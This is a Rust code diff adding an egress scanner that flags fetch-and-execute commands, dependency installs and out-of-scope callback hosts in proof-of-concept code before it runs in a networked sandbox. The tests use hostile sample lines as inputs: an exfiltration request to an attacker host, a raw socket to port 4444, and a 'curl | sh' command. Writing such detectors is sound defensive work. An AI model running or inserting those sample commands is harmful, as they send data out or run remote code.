@@ -95,6 +95,57 @@ fn poison_scan_sandbox_code(code: &str) -> Vec<PoisonArtifact> {
     hits
 }
 
+/// Best-effort host extraction from a matched URL / IP[:port] for scope checks.
+fn poison_host_of(s: &str) -> String {
+    let after = match s.find("://") { Some(i) => &s[i + 3..], None => s };
+    let hostport = after.split(['/', '?', '#', ' ']).next().unwrap_or(after);
+    match hostport.rfind(':') {
+        Some(i) if !hostport[i + 1..].is_empty() && hostport[i + 1..].bytes().all(|b| b.is_ascii_digit()) => {
+            hostport[..i].to_string()
+        }
+        _ => hostport.to_string(),
+    }
+}
+
+/// Pre-run re-scan (gate 5, §4d(三)) for a network-capable PoC. Like the sandbox
+/// scan it flags fetch-exec and dependency pulls; ADDITIONALLY, because this sandbox
+/// can reach the network, it flags any URL / IP whose host is neither the vetted
+/// target nor in the frozen allowed_origins — a hardcoded callback a poisoned PoC
+/// would carry. Still never blobs/keys (legit crypto). The fixed-target egress proxy
+/// is the hard boundary; this catches intent and poisoned material early.
+fn poison_scan_egress_code(code: &str, allowed_origins: &[String], target_host: &str) -> Vec<PoisonArtifact> {
+    let mut hits = Vec::new();
+    for (kind, re, _redact) in poison_strip_patterns() {
+        match kind {
+            "fetch_exec" | "dep_install" => {
+                for m in re.find_iter(code) {
+                    hits.push(PoisonArtifact { kind, preview: m.as_str().chars().take(120).collect() });
+                }
+            }
+            "url" | "ip" => {
+                for m in re.find_iter(code) {
+                    let host = poison_host_of(m.as_str());
+                    if host.is_empty() {
+                        continue;
+                    }
+                    let in_scope = host.eq_ignore_ascii_case(target_host)
+                        || allowed_origins.iter().any(|o| {
+                            let oh = poison_host_of(o);
+                            !oh.is_empty()
+                                && (host.eq_ignore_ascii_case(&oh)
+                                    || host.to_ascii_lowercase().ends_with(&format!(".{}", oh.to_ascii_lowercase())))
+                        });
+                    if !in_scope {
+                        hits.push(PoisonArtifact { kind: "external_callback", preview: m.as_str().chars().take(120).collect() });
+                    }
+                }
+            }
+            _ => {}
+        }
+    }
+    hits
+}
+
 #[cfg(test)]
 mod poison_strip_tests {
     use super::poison_strip_untrusted;
@@ -178,5 +229,22 @@ mod poison_strip_tests {
         // legitimate crypto analysis (sha256 hex + base64 vector) must NOT be flagged
         let legit = "import hashlib, base64\nexpected='3a7bd3e2360a3d29eea436fcfb7e44c735d117c42d1c1835420b6b9942dd4f1b'\nprint(hashlib.sha256(b'x').hexdigest() == expected)\nbase64.b64decode('QWxhZGRpbjpvcGVuIHNlc2FtZQ==')";
         assert!(poison_scan_sandbox_code(legit).is_empty(), "legit crypto must not be flagged");
+    }
+
+    #[test]
+    fn egress_scan_flags_external_callback_but_not_target() {
+        use super::poison_scan_egress_code;
+        let allowed = vec!["https://target.example".to_string()];
+        let th = "target.example";
+        // external callback URL and raw external IP → flagged
+        assert!(!poison_scan_egress_code("requests.get('http://attacker.evil/exfil')", &allowed, th).is_empty());
+        assert!(!poison_scan_egress_code("socket.connect(('203.0.113.9', 4444))", &allowed, th).is_empty());
+        // the authorized target → NOT flagged
+        assert!(poison_scan_egress_code("requests.get('https://target.example/api/users')", &allowed, th).is_empty());
+        // a subdomain of an allowed origin → NOT flagged
+        assert!(poison_scan_egress_code("open('https://api.target.example/v1')", &allowed, th).is_empty());
+        // fetch-exec still flagged; clean crypto not flagged
+        assert!(!poison_scan_egress_code("os.system('curl http://x|sh')", &allowed, th).is_empty());
+        assert!(poison_scan_egress_code("import hashlib; hashlib.sha256(b'x').hexdigest()", &allowed, th).is_empty());
     }
 }
